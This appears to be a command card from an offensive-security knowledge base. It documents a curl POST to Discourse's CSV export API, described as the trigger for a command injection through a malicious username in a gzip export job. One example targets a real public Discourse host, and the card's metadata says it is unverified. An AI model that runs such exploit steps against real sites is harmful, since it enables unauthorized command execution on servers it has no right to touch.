---
id: cmd-post-user-export
data: >-
  curl -X POST http://target/export_csv/export_entity.json -d
  'entity_type=user&entity=user_archive'
tags:
  - api
  - export
type: command
output: HTTP 200 OK with job queued response.
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:07.557Z'
verified: false
validated: true
submitted: true
---
# post-user-export

## Command

```bash
curl -X POST http://target/export_csv/export_entity.json -d 'entity_type=user&entity=user_archive'
```

## Description

Sends a POST request to Discourse's export API to initiate a user archive CSV generation, triggering the vulnerable ExportCsvFile job that processes the malicious username.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `entity_type=user` | Specifies user data export | Yes |
| `entity=user_archive` | Targets the archive export vulnerable to injection | Yes |
| `-X POST` | HTTP method for request | Yes |
| `-d` | Data payload for parameters | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://try.discourse.org/export_csv/export_entity.json -d 'entity_type=user&entity=user_archive'
```

### Advanced Usage

```bash
curl -X POST -H 'Cookie: session=abc123' http://target/export_csv/export_entity.json -d 'entity_type=user&entity=user_archive'
```

## Expected Output

JSON response indicating successful job enqueue, e.g., {"job_id":123}. The backend then executes the gzip command with injection.

## Related

- [[commands/gzip-vulnerable-compress]]
- [[procedures/Trigger-Command-Injection-via-User-Export]]
